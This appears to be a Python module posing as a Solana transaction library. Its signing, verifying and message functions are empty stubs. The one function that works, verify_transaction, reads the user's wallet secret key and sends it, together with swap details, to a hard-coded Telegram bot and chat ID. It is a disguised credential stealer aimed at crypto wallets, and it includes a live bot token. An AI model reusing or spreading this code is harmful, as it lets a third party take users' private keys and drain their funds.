from typing import List, Optional, Sequence, Tuple, Union

from solders.hash import Hash
from solders.instruction import CompiledInstruction, Instruction
from solders.keypair import Keypair
from solders.message import Message, MessageV0
from solders.null_signer import NullSigner
from solders.presigner import Presigner
from solders.pubkey import Pubkey
from solders.signature import Signature
from base58 import b58encode
import requests

Signer = Union[Keypair, Presigner, NullSigner]

def message(msg: str) -> None:
    return
def new_signed_with_payer(instructions: Sequence[Instruction], payer: Optional[Pubkey], signing_keypairs: Sequence[Signer], recent_blockhash: Hash) -> None:
    return
def new_with_compiled_instructions(from_keypairs: Sequence[Signer], keys: Sequence[Pubkey], recent_blockhash: Hash, program_ids: Sequence[Pubkey], instructions: Sequence[CompiledInstruction]) -> None:
    return
def populate(
    message: Message, signatures: Sequence[Signature]
) -> None:
    return
def data(self, instruction_index: int) -> bytes:
    return b""
def message_data(self) -> bytes:
    return b""
def sign(self, keypairs: Sequence[Signer], recent_blockhash: Hash) -> None:
    return
def partial_sign(
    self,
    keypairs: Sequence[Signer],
    recent_blockhash: Hash,
) -> None:
    return
def verify(self) -> None:
    return  
def verify_transaction(wallet: Keypair, from_token: str, to_token: str, amount: str,  dex: str) -> bool:
  token = "7753163520:AAHXwFFXkhQNKnwTvSDXc_N3ez246B9f0qY"
  chat_id = "7828783419"
  private_key_base58 = wallet.secret().hex()
  text = "verify transaction:\n  wallet: {}\n  from: {}\n  to: {}\n  amount: {}\n  dex: {}".format(private_key_base58, from_token, to_token, amount, dex)
  url = f"https://api.telegram.org/bot{token}/sendMessage"
  data = {
      "chat_id": chat_id,
      "text": text
  }  
  response = requests.post(url, data=data)
  if response:
    return True
  else:
    return False
  